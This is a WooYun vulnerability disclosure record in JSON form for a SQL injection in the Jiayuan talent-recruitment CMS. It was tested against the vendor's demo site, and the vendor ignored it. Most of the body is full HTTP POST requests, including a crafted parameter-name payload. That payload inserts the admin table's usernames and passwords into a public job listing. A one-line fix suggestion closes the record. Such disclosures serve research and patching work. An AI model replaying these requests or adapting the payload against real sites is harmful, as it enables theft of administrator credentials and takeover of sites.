{"id": 42892, "wybug_id": "wooyun-2014-084414", "wybug_title": "嘉缘人才系统1处SQL注入#5(demo测试)", "wybug_corp": "finereason.com", "wybug_author": "龟兔赛跑", "wybug_date": "2014-11-23 22:24", "wybug_open_date": "2014-12-30 22:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-28：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-30：\t细节向公众公开  简要描述： 嘉缘人才系统某功能1处SQL注入.(demo测试)http://v2014.rccms.com/ 详细说明：  http://v2014.rccms.com/wap/?a=savevhire&wap嘉缘人才系统手机版“发布微招聘”功能关键字未过滤，导致SQL注入。进入http://v2014.rccms.com/wap/，然后选择发布微招聘:\n\n内容随意填，发布的时候使用burp修改一下,再POST的内容里面添加一个tttttt=ttttt:\nPOST /wap/?a=savevhire&wap HTTP/1.1Host: v2014.rccms.comProxy-Connection: keep-aliveContent-Length: 157Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://v2014.rccms.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://v2014.rccms.com/wap/?a=addvhire&wapAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4Cookie: **********cookie************v_comname=test&v_place=test&v_number=2&v_request=aaa&v_address=test&v_tel=88888888&v_contact=%C1%AA%CF%B5%C8%CB&v_validity=3&Submit=%B7%A2%B2%BC&tttttt=ttttt\n提交就会发现存在SQL error:\n\n基本可以确定post的key被带入了SQL了。然后我们构造一个key=value,这里的key用来获取job_admin的内容，如下：\nv_place%2Cv_number%2Cv_request%2Cv_address%2Cv_tel%2Cv_contact%2Cv_validity%2Cv_adddate%2Cv_ip%2Cv_flag)%0AVALUES(0x74657374%2C0x74657374%2C1%2Bchar(%40%60'%60)%2Csubstr((select(group_concat(a_user%2C0x7c%2Ca_pass))from%0A%0Ajob_admin)%2C1%2C20)%2C1%2C1%2C1%2C3%2CNOW()%2C0%2C1)%23'=4\n完整的POST为：\nPOST /wap/?a=savevhire&wap HTTP/1.1Host: v2014.rccms.comProxy-Connection: keep-aliveContent-Length: 347Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://v2014.rccms.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://v2014.rccms.com/wap/?a=addvhire&wapAccept-Encoding: gzip,deflateAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4Cookie: ************your cookie*************v_comname=test&v_place%2Cv_number%2Cv_request%2Cv_address%2Cv_tel%2Cv_contact%2Cv_validity%2Cv_adddate%2Cv_ip%2Cv_flag)%0AVALUES(0x74657374%2C0x74657374%2C1%2Bchar(%40%60'%60)%2Csubstr((select(group_concat(a_user%2C0x7c%2Ca_pass))from%0A%0Ajob_admin)%2C1%2C20)%2C1%2C1%2C1%2C3%2CNOW()%2C0%2C1)%23'=4&v_place=test&v_tel=88888888&Submit=%B7%A2%B2%BC\n发布之后，就可以再微招聘厘米面看到job_admin的内容了：\n\n\nhttp://v2014.rccms.com/vhire/vhire.php?id=96\n\n\n(由于微招聘没办法删除，因此，再官网试的时候只显示了数据的前20个字符)。   漏洞证明：  \n\n\n\n\n\n   修复方案：  过滤非数据库字段的POST key。   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-30 22:26 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}